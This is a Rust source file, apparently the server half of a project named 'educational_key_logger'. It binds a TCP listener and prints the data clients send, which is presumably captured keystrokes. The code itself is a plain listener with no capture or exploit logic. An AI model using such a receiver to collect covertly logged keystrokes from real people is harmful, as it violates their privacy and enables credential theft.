use educational_key_logger::IP_PORT;
use std::io::Read;
use std::net::{TcpListener, TcpStream};

fn main() {
    let listener = TcpListener::bind(IP_PORT).unwrap();
    for stream in listener.incoming() {
        handle_stream(stream.unwrap());
    }
}

fn handle_stream(mut stream: TcpStream) {
    let mut buffer = [0; 1024];
    loop {
        match stream.read(&mut buffer) {
            Ok(0) => {
                println!("Client disconnected");
                break;
            }
            Ok(bytes_read) => {
                let message = String::from_utf8_lossy(&buffer[..bytes_read]);
                print!("Received: {}", message);
            }
            Err(e) => {
                println!("Read error: {}", e);
                break;
            }
        }
    }
}
